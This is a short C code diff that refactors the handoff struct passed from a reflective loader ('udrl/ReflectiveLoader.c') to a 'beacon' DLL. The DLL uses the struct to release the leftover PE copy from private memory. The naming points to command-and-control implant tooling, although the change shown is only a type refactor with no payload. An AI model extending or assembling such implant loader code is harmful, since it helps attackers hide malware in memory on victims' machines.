@@ -32,8 +32,12 @@ static void settings_init_once(HINSTANCE hinstDLL) {
  * PE copy it still holds can go. Guards: the magic, a committed PRIVATE
  * region, and not inside our own image - a wrong or foreign parameter is
  * ignored (legacy callers pass anything, including NULL). */
+/* loader -> beacon handoff (udrl/ReflectiveLoader.c builds one on its
+ * stack and passes it as the reason-4 parameter) */
+typedef struct { DWORD magic; void *alloc; } BW_HANDOFF;
+
 static void container_release(LPVOID lpReserved) {
-	struct { DWORD magic; void *alloc; } *ho = (struct { DWORD magic; void *alloc; } *)lpReserved;
+	BW_HANDOFF *ho = (BW_HANDOFF *)lpReserved;
 	MEMORY_BASIC_INFORMATION mbi;
 	unsigned char *img, *img_end;
 
